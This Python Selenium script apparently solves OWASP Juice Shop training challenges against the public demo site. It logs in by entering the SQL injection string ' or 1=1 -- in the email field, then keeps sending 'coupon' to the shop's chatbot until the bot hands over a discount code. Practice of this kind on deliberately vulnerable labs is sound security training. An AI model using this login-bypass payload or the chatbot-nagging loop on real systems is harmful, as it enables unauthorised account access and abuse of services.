from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
import os
from selenium.webdriver.common.by import By
from time import sleep
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys

def get_browser():
    return webdriver.Chrome()

def closing_welcome_button(browser):
    sleep(5)
    closing_welcome_button = browser.find_element(By.CSS_SELECTOR, "button[aria-label='Close Welcome Banner']")
    action = ActionChains(browser)
    action.click(on_element = closing_welcome_button)
    action.perform()

def loginUser(browser, url):
    loginUrl = url + 'login'
    browser.get(loginUrl)
    closing_welcome_button(browser)

    email = "' or 1=1 --"
    password = 'anything'

    input_email = browser.find_element(By.ID, 'email')
    input_password = browser.find_element(By.ID, 'password')
    login_btn = browser.find_element(By.ID, 'loginButton')

    actions = ActionChains(browser)
    actions.send_keys_to_element(input_email, email)
    actions.send_keys_to_element(input_password, password)
    actions.click(login_btn)
    actions.perform()
    sleep(3)

def getCouponFromChatbot(browser, url):
    chatbotUrl = url + 'chatbot'
    browser.get(chatbotUrl)
    sleep(3)
    flag = False

    while not flag:
        spamCoupon(browser)
        sleep(5)
        flag = checkIfCouponIsGiven(browser)
    

def checkIfCouponIsGiven(browser):
    responses = browser.find_elements(By.CLASS_NAME, 'speech-bubble-left')
    res = responses[-1].text
    coupon_str = 'Oooookay, if you promise to stop nagging me here'
    if coupon_str in res:
        return True
    return False

def spamCoupon(browser):
    msg = 'coupon'
    inputMsg = browser.find_element(By.ID, 'message-input')
    actions = ActionChains(browser)
    actions.send_keys_to_element(inputMsg, msg)
    actions.send_keys_to_element(inputMsg, Keys.ENTER)
    actions.perform()

url = 'https://demo.owasp-juice.shop/#/'
browser = get_browser()
loginUser(browser, url)
getCouponFromChatbot(browser, url)
sleep(5)
browser.quit()